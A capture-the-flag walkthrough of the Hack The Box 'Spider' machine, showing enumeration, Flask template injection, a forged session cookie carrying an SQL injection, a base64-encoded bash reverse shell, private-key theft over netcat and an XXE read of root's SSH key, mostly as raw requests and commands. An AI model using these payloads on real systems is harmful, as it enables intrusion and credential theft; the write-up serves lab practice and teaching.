# Enumeration
## Port
|Port|Service|Version|
|----|----|-----|
|22|SSH|OpenSSH 7.6p1 Ubuntu 4ubuntu0.3|
|80|HTTP|nginx 1.14.0|
## NMAP
```bash
# Nmap 7.91 scan initiated Mon May 31 06:48:23 2021 as: nmap -A -v -T4 -oN intial.nmap spider.htb
Nmap scan report for spider.htb (10.129.115.66)
Host is up (0.24s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 28:f1:61:28:01:63:29:6d:c5:03:6d:a9:f0:b0:66:61 (RSA)
|   256 3a:15:8c:cc:66:f4:9d:cb:ed:8a:1f:f9:d7:ab:d1:cc (ECDSA)
|_  256 a6:d4:0c:8e:5b:aa:3f:93:74:d6:a8:08:c9:52:39:09 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST GET OPTIONS HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: 500 Internal Server Error
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=5/31%OT=22%CT=1%CU=39126%PV=Y%DS=2%DC=T%G=Y%TM=60B486D
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Uptime guess: 5.428 days (since Tue May 25 20:32:21 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT       ADDRESS
1   239.17 ms 10.10.14.1
2   239.30 ms spider.htb (10.129.115.66)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 31 06:49:03 2021 -- 1 IP address (1 host up) scanned in 41.12 seconds
```
## Web
### Directory Fuzzing
```bash
kali@kali:~/HackTheBox/Spider$ ffuf -u http://spider.htb/FUZZ -w /usr/share/wordlists/dirb/big.txt -e .php,.html,.txt -t 200 -c 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://spider.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Extensions       : .php .html .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

login                   [Status: 200, Size: 1832, Words: 442, Lines: 78]
logout                  [Status: 302, Size: 209, Words: 22, Lines: 4]
register                [Status: 200, Size: 2130, Words: 551, Lines: 86]
user                    [Status: 302, Size: 219, Words: 22, Lines: 4]
view                    [Status: 302, Size: 219, Words: 22, Lines: 4]
:: Progress: [81876/81876] :: Job [1/1] :: 543 req/sec :: Duration: [0:03:20] :: Errors: 0 ::
```
Got few endpoints. /register looks intresting at first so let's go there and create a account.
Loggin in we can see it is a shop.
Registering the user we can see that /user endpoint reflects the username for us so we can try SSTI on it.
### SSTI
We can try flask SSTI as we could see that the cookie is flask token so let's try that.
#### Verification
```bash
POST /register HTTP/1.1
Host: spider.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 105
Origin: http://spider.htb
Connection: close
Referer: http://spider.htb/register
Cookie: session=
Upgrade-Insecure-Requests: 1


username=%7B%7B10+%2B+10%7D%7D&confirm_username=%7B%7B10%2B10%7D%7D&password=oops&confirm_password=oops
```
registering an account with username {{10+10}}.
We Got redirected to
```bash
GET /login?uuid=ff5af298-10c6-4177-9b5e-7761a4f0dc24 HTTP/1.1
Host: spider.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://spider.htb/register
Connection: close
Cookie: session=
Upgrade-Insecure-Requests: 1
```
Let's follow the redirection.
We redirect to the login page with the uuid now enter the password and login.
```bash
POST /login HTTP/1.1
Host: spider.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Origin: http://spider.htb
Connection: close
Referer: http://spider.htb/login?uuid=ff5af298-10c6-4177-9b5e-7761a4f0dc24
Cookie: session=
Upgrade-Insecure-Requests: 1


username=ff5af298-10c6-4177-9b5e-7761a4f0dc24&password=test
```
After that we are logged in as {{10+10}} now let's go to /user endpoint.
```bash
GET /user HTTP/1.1
Host: spider.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://spider.htb/
Cookie: session=eyJjYXJ0X2l0ZW1zIjpbXSwidXVpZCI6ImZmNWFmMjk4LTEwYzYtNDE3Ny05YjVlLTc3NjFhNGYwZGMyNCJ9.YLSbeQ.GF_3hBHx9_OzuyT4qhVC-kMC8HU
Upgrade-Insecure-Requests: 
```
Now let's see the response to this request
```html
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Mon, 31 May 2021 08:18:41 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Vary: Cookie
Content-Length: 1776


<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="/static/semantic-ui/semantic.min.css" />
    <link rel="stylesheet" href="/static/css/core-style.css" />
    <title></title>
  </head>
  <body>
    

<style>
  .ui.segment.main {
    background: rgb(240, 221, 139);
    text-align: center;
    overflow: hidden;
    height: 100vh;
  }

  .ui.divided.grid {
    height: 100%;
  }

  .login-holder {
    width: 100%;
    display: flex;
    flex-direction: row;
    flex-wrap: wrap;
    justify-content: center;
    align-items: center;
  }

  .ui.form {
    width: 25%;
  }
</style>

<div class="ui segment main">
  <div class="ui divided grid">
    <div class="ui row">
      <div class="ui column">
        <h1 class="ui header" style="margin-top: 20px;">User information</h1>
      </div>
    </div>
    <div class="ui divider"></div>
    <div class="ui row" style="height: 50%;">
      <div class="ui column">
        <div class="login-holder">

          <form action="#" class="ui form">
            <div class="field">
              <label>Username</label>
              <input type="text" name="username" readonly value="20" />
            </div>
            <div class="field">
              <label>UUID</label>
              <input type="text" name="uuid" readonly value="ff5af298-10c6-4177-9b5e-7761a4f0dc24" />
            </div>
          </form>

        </div>
      </div>
    </div>
    <div class="ui divider"></div>
    <div class="ui row">
      <div class="ui column">
        <h2 class="ui header" style="margin-bottom: 10px;">
          Zeta Products.
        </h2>
      </div>
    </div>
  </div>
</div>


  </body>
</html>
```
Now we can see the 20 in the value field so SSTI confirmed.
#### Exploitation
We cannot try for  RCE as there is word limit for username I cannot get around that so all the best to people who wanna try it.
Now let's try to get some basic config file as we know it's running flask we can get config file with username {{config}} to get flask configuration.
Triggering SSTI we can get the following value in username field.
```bash
<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': 'Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'RATELIMIT_ENABLED': True, 'RATELIMIT_DEFAULTS_PER_METHOD': False, 'RATELIMIT_SWALLOW_ERRORS': False, 'RATELIMIT_HEADERS_ENABLED': False, 'RATELIMIT_STORAGE_URL': 'memory://', 'RATELIMIT_STRATEGY': 'fixed-window', 'RATELIMIT_HEADER_RESET': 'X-RateLimit-Reset', 'RATELIMIT_HEADER_REMAINING': 'X-RateLimit-Remaining', 'RATELIMIT_HEADER_LIMIT': 'X-RateLimit-Limit', 'RATELIMIT_HEADER_RETRY_AFTER': 'Retry-After', 'UPLOAD_FOLDER': 'static/uploads'}>
```
Now we have the secret key of flask token so we can sign our own tokens but let's try and enumerate further.
Now let's see our cookie. For this let's use the tool called flask-unsign.
```bash
kali@kali:~/HackTheBox/Spider$ flask-unsign --decode --cookie eyJjYXJ0X2l0ZW1zIjpbXSwidXVpZCI6Ijc5N2E4ZTBmLTFiMjItNDcwNC05Mjk5LTRkYmMwZTEyMTg2NyJ9.YLSfJQ.Rg0ag2EgyUlC76WpNngvs3yiyvE
{'cart_items': [], 'uuid': '797a8e0f-1b22-4704-9299-4dbc0e121867'}
```
Now that we have secret token we can modify the cookie so cart_item does seem intrestring but if we can get login bypass in uuid we can be admin so let's try that first and we can always go back to cart_items later.
So let's try some basic authorization bypass on uuid in the cookie section.
```bash
kali@kali:~/HackTheBox/Spider$ flask-unsign --sign --secret Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942 --cookie "{'uuid': '\' or 1=1 #'}"
eyJ1dWlkIjoiJyBvciAxPTEgIyJ9.YLWl6g.ZkgUj1penb-UY6mYiNIdseOjhBY
```
And we have the cookie for it just open the developer tools, then go to storage tab and just replace the existing cookie with our newly generated cookie.
and you can it shows that you are login as chiv.
Now navigating around the site and fumbling at this point for a while found and under upgrade endpoint at http://spider.htb/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal. So let's visit that endpoint.
Looks like there is a support portal that post our ticket somewhere so we can try SSTI but as we dont have any ways to verify it let's try to get the ping back.
### SSTI 2
#### Enumeration
Now let's and use one of the basic payload to get RCE from SSTI and see what error it gives us it highly unlikely that we will get a ping back but let's start from here and let's see where go.
payload	
```python
{% with a = request\["application"\]\["\\x5f\\x5fglobals\\x5f\\x5f"\]\["\\x5f\\x5fbuiltins\\x5f\\x5f"\]\["\\x5f\\x5fimport\\x5f\\x5f"\]("os")\["popen"\]("ping -c 4 <YOUR IP>")\["read"\]() %} a {% endwith %}
```
Let's send this payload  to that form.
```bash
POST /a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal HTTP/1.1
Host: spider.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 331
Origin: http://spider.htb
Connection: close
Referer: http://spider.htb/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal
Cookie: session=eyJjYXJ0X2l0ZW1zIjpbXSwidXVpZCI6Iicgb3IgMT0xICMifQ.YLWl-g.9GDmlx3KLu0Ozar4gnZq5GgB63M
Upgrade-Insecure-Requests: 1


contact=%7B%25+with+a+%3D+request%5B%22application%22%5D%5B%22%5Cx5f%5Cx5fglobals%5Cx5f%5Cx5f%22%5D%5B%22%5Cx5f%5Cx5fbuiltins%5Cx5f%5Cx5f%22%5D%5B%22%5Cx5f%5Cx5fimport%5Cx5f%5Cx5f%22%5D%28%22os%22%29%5B%22popen%22%5D%28%22ping+-c+4+10.10.14.7%22%29%5B%22read%22%5D%28%29+%25%7D+a+%7B%25+endwith+%25%7D%0D%0A&message=%7B%25+with+a+%3D+request%5B%22application%22%5D%5B%22%5Cx5f%5Cx5fglobals%5Cx5f%5Cx5f%22%5D%5B%22%5Cx5f%5Cx5fbuiltins%5Cx5f%5Cx5f%22%5D%5B%22%5Cx5f%5Cx5fimport%5Cx5f%5Cx5f%22%5D%28%22os%22%29%5B%22popen%22%5D%28%22ping+-c+4+10.10.14.7%22%29%5B%22read%22%5D%28%29+%25%7D+a+%7B%25+endwith+%25%7D%0D%0A
```
We got the response saying "Hmmm, you seem to have hit a our WAF with the following chars: . " so we can say that we cannnot use '.' in our payload so let's try to base64 encode our payload as it is the basic way to avoid such restrictions.
```bash
kali@kali:~/HackTheBox/Spider$ echo -n 'ping -c 4 <YOUR IP>' | base64
cGluZ<-----SNIP------>E0Ljc=
```
So lets's try and send it.
```bash
kali@kali:~/HackTheBox/Spider$ sudo tcpdump -i tun0 -n icmp
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
04:07:37.965482 IP 10.10.10.243 > 10.10.14.7: ICMP echo request, id 21857, seq 1, length 64
04:07:37.965916 IP 10.10.14.7 > 10.10.10.243: ICMP echo reply, id 21857, seq 1, length 64
04:07:37.965482 IP 10.10.10.243 > 10.10.14.7: ICMP echo request, id 21857, seq 1, length 64
04:07:37.965916 IP 10.10.14.7 > 10.10.10.243: ICMP echo reply, id 21857, seq 1, length 64
04:07:37.965482 IP 10.10.10.243 > 10.10.14.7: ICMP echo request, id 21857, seq 1, length 64
04:07:37.965916 IP 10.10.14.7 > 10.10.10.243: ICMP echo reply, id 21857, seq 1, length 64
04:07:37.965482 IP 10.10.10.243 > 10.10.14.7: ICMP echo request, id 21857, seq 1, length 64
04:07:37.965916 IP 10.10.14.7 > 10.10.10.243: ICMP echo reply, id 21857, seq 1, length 64
```
Got that call back with base64 encoded payload.
So we have RCE now let's get the rev shell.
Create a file with basic reverse shell payload.
```bash
bash -i >& /dev/tcp/<YOUR IP>/<PORT>
```
and then juse base64 encode it.
```bash
cat <FILENAME> | base64
```
Where filename is the name of above file.
And then just eand that base64 encoded payload to the Contact feild in the form.
###### payload
```python
{% with a = request\["application"\]\["\\x5f\\x5fglobals\\x5f\\x5f"\]\["\\x5f\\x5fbuiltins\\x5f\\x5f"\]\["\\x5f\\x5fimport\\x5f\\x5f"\]("os")\["popen"\]("echo -n <YOUR BASE64 encoded data> | base64 -d | bash")\["read"\]() %} a {% endwith %}
```

```bash
POST /a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal HTTP/1.1
Host: spider.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 399
Origin: http://spider.htb
Connection: close
Referer: http://spider.htb/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal
Cookie:session=eyJjYXJ0X2l0ZW1zIjpbXSwidXVpZCI6Iicgb3IgMT0xICMifQ.YLWySA.frei1g7SnJjAsGrkhkv-0rOcxrA
Upgrade-Insecure-Requests: 1


contact=%7B%25+with+a+%3D+request%5B%22application%22%5D%5B%22%5Cx5f%5Cx5fglobals%5Cx5f%5Cx5f%22%5D%5B%22%5Cx5f%5Cx5fbuiltins%5Cx5f%5Cx5f%22%5D%5B%22%5Cx5f%5Cx5fimport%5Cx5f%5Cx5f%22%5D%28%22os%22%29%5B%22popen%22%5D%28%22echo+-n+YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC43LzEyMzQgMD4mMQo%3D+%7C+base64+-d+%7C+bash%22%29%5B%22read%22%5D%28%29+%25%7D+a+%7B%25+endwith+%25%7D&message=YOU+ARE++DOOMED%21
```
And boom we have the rev shell.
```bash
kali@kali:~/HackTheBox/Spider$ rlwrap nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.243] 51634
bash: cannot set terminal process group (1441): Inappropriate ioctl for device
bash: no job control in this shell
chiv@spider:/var/www/webapp$ id
uid=1000(chiv) gid=33(www-data) groups=33(www-data)
chiv@spider:/var/www/webapp$ 
```
# WWW-Data to Chiv
Looking at the above id command result we are user chiv so not much tough to escalte to chiv as we are part of chiv user group.
```bash
chiv@spider:/var/www/webapp$ cd /home/chiv
chiv@spider:~$ ls -al
total 188
drwxr-xr-x 7 chiv chiv   4096 Jun  1 04:01 .
drwxr-xr-x 3 root root   4096 May  6 11:42 ..
lrwxrwxrwx 1 root root      9 Apr 24  2020 .bash_history -> /dev/null
-rw-r--r-- 1 chiv chiv    220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 chiv chiv   3771 Apr  4  2018 .bashrc
drwx------ 2 chiv chiv   4096 May 18 00:23 .cache
drwxr-x--- 3 chiv chiv   4096 Jun  1 04:01 .config
drwx------ 3 chiv chiv   4096 Jun  1 04:02 .gnupg
drwxrwxr-x 3 chiv chiv   4096 May 18 00:23 .local
-rw-r--r-- 1 chiv chiv 146086 Jun  1 04:03 output
-rw-r--r-- 1 chiv chiv    807 Apr  4  2018 .profile
drwx------ 2 chiv chiv   4096 May  6 11:42 .ssh
-r-------- 1 chiv chiv     33 Jun  1 03:05 user.txt
```
we can list the dir in chiv lets add our ssh key pair over there.
```bash
chiv@spider:~$ cd .ssh
chiv@spider:~/.ssh$ ls -al
ls -al
total 16
drwx------ 2 chiv chiv 4096 May  6 11:42 .
drwxr-xr-x 7 chiv chiv 4096 Jun  1 04:01 ..
-rw-r--r-- 1 chiv chiv  393 May  4 15:42 authorized_keys
-rw------- 1 chiv chiv 1679 Apr 24  2020 id_rsa
```
Looks like we have id_rsa over here for us so let's just get that and SSH into chiv.
```bash
chiv@spider:~/.ssh$ nc 10.10.14.7 12345 < id_rsa
```
On your terminal
```bash
kali@kali:~/HackTheBox/Spider$ rlwrap nc -nlvp 12345 > id_rsa
listening on [any] 12345 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.243] 36206
```
Now we got id_rsa on our machine let's login as chiv.
```bash
kali@kali:~/HackTheBox/Spider$ chmod 700 id_rsa
kali@kali:~/HackTheBox/Spider$ ssh -i id_rsa chiv@spider.htb
```
# PrivESC to Root
## ss -tupln
```bash
ss -tupln
Netid  State    Recv-Q   Send-Q      Local Address:Port     Peer Address:Port   
udp    UNCONN   0        0           127.0.0.53%lo:53            0.0.0.0:*      
tcp    LISTEN   0        80              127.0.0.1:3306          0.0.0.0:*      
tcp    LISTEN   0        128               0.0.0.0:80            0.0.0.0:*      
tcp    LISTEN   0        100             127.0.0.1:8080          0.0.0.0:*      
tcp    LISTEN   0        128         127.0.0.53%lo:53            0.0.0.0:*      
tcp    LISTEN   0        128               0.0.0.0:22            0.0.0.0:*      
tcp    LISTEN   0        128                  [::]:
```
We can see there a local server on port 8080 so let's portfwd it.
```bash
kali@kali:~/HackTheBox/Spider$ ssh -i id_rsa -L 8080:127.0.0.1:8080 chiv@spider.htb
```
I was having some trouble with port forwading with SSH so I used sshtunnel one of the python modules to create a tunnel.
```bash
kali@kali:~/HackTheBox/Spider$ python3 -m sshtunnel -K id_rsa -L :1234 -R 127.0.0.1:8080 -p 22 -U chiv 10.10.10.243


            Press <Ctrl-C> or <Enter> to stop!
```
Now let's visit the website.
We can see that it has a login page which doesn't require password to authenticate so let's try the only username that we know chiv.
And we are logged in.
I tried to give it a false but nevertheless it logged in so that is intresting.
```bash
POST /login HTTP/1.1
Host: 127.0.0.1:1234
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://127.0.0.1:1234
Connection: close
Referer: http://127.0.0.1:1234/login
Cookie: _ga=GA1.1.556007235.1605286952; BEEFHOOK=2U1KV8VTRjtguOVmiksnJuXHVJlqbH0MmHD2YYgEp0E4zwnZCfXegCxua3jgW6RhAbkJZUw6d24n1DLG; csrftoken=EmT9kL6ZyqW9B5TgA5VTXJj2papMqnTChcMCTHQ3BuKPrQcGZqdJMKDeJmb1iudO; language=en; cookieconsent_status=dismiss; welcomebanner_status=dismiss; continueCode=89HwumhXtkIJT9C8sLF5iLfZS1UaHBuJhRtqcnI6TbCMsLFxfwSyH3u4h9tncaI6Cos1Fei4fDSYUOJuZZh9mcpBIy5CPWs1qF4qipoflkSyBUz9uD7h13tvmcM5IE7TPWCans1oFL7iDpUaLH4Xu61hBlckmI3WT1nC57szXFKDfzLS8kU12HQLuMRtXjcYYI6BTg3C2vsgEF1qiOlfx5SE2HPm; session=eyJwb2ludHMiOjB9.YLXpkQ.U2F_qxHZ1tRO56W8iAXqmPaqtKM
Upgrade-Insecure-Requests: 1


username=Zxelex&version=1.0.0r
```
Looking closely at the request we can see it is using application/xhtml+xml as its Accept header, so we can try XXE injection.
For payload I refered to the following website.
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
Looking at the structure of the website we know that we cannot inject XXE payload in the username field but what we can do is we can insert the payload in version feild and call that entity in the username field. It is complex to read but now worries with the below request we can understand it easily.
```bash
POST /login HTTP/1.1
Host: 127.0.0.1:1234
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 23
Origin: http://127.0.0.1:1234
Connection: close
Referer: http://127.0.0.1:1234/login
Cookie: _ga=GA1.1.556007235.1605286952; BEEFHOOK=2U1KV8VTRjtguOVmiksnJuXHVJlqbH0MmHD2YYgEp0E4zwnZCfXegCxua3jgW6RhAbkJZUw6d24n1DLG; csrftoken=EmT9kL6ZyqW9B5TgA5VTXJj2papMqnTChcMCTHQ3BuKPrQcGZqdJMKDeJmb1iudO; language=en; cookieconsent_status=dismiss; welcomebanner_status=dismiss; continueCode=89HwumhXtkIJT9C8sLF5iLfZS1UaHBuJhRtqcnI6TbCMsLFxfwSyH3u4h9tncaI6Cos1Fei4fDSYUOJuZZh9mcpBIy5CPWs1qF4qipoflkSyBUz9uD7h13tvmcM5IE7TPWCans1oFL7iDpUaLH4Xu61hBlckmI3WT1nC57szXFKDfzLS8kU12HQLuMRtXjcYYI6BTg3C2vsgEF1qiOlfx5SE2HPm; session=eyJwb2ludHMiOjB9.YLcLag.apgZ9quRcaS1LlTf3nN8EWCf78Q
Upgrade-Insecure-Requests: 1


username=%26username%3b&version=1.0.0--><!DOCTYPE+foo+[<!ENTITY+username+SYSTEM+"/root/.ssh/id_rsa">+]><!--
```
We can see from above request we injected the XXE payload in the version field and then we declared the entity username that payload and then we called the username entitiy in the username feild more like a tounge twister right I KNOW.
We got the RSA key for the root.
Now let's login as root and get all the flags.
For some reason the SSH wasn't working all that well for me so it wrote a python script to connect to SSH. It is more like a pseudo shell but you know something is better than nothing.
## I Didn't use ssh at all for this box I used the below method for this box so you can try the above ssh method that should work for you but didn't work for we so below is the method that you want to try if SSH isn't working for you.
## Python Script
```python
#!/usr/bin/python3

import paramiko
from pwn import *
import sys
#from forward import forward_tunnel
import sshtunnel
'''
def Portfwd():
	with sshtunnel.open_tunnel(
		('spider.htb', 22),
		ssh_username="chiv",
		ssh_pkey="/home/kali/HackTheBox/Spider/id_rsa",
		#ssh_private_key_password="secret",
		remote_bind_address=('spider.htb', 22),
		local_bind_address=('0.0.0.0', 1234)
	) as tunnel:
		client = paramiko.SSHClient()
		client.load_system_host_keys()
		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		client.connect('spider.htb', 22)
		# do some operations with client session
		client.close()
	success('Portfwd successful')
'''


def Shell():
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	user = 'root'
	host = 'spider.htb'

	k = paramiko.RSAKey.from_private_key_file('/home/kali/HackTheBox/Spider/root')
	ssh.connect(host,username=user,pkey=k)
	while(True):
		command = input("[+] Enter the command::")
		#print ("="*50, command, "="*50)
		success('Executing command')
		stdin, stdout, stderr = ssh.exec_command(command)
		print (stdout.read().decode())
		err = stderr.read().decode()
		if err:
			print (err)

#Portfwd()
Shell()
```
I tried to portfwd using this script but later I found the another way to port forward so I used that.
## Portfwd
```bash
kali@kali:~/HackTheBox/Spider$ python3 -m sshtunnel -K /home/kali/HackTheBox/Spider/id_rsa -L :1234 -R 127.0.0.1:8080 -p 22 -U chiv spider.htb


            Press <Ctrl-C> or <Enter> to stop!
			
```
I used the above method to portfwd using python module called sshtunnel.
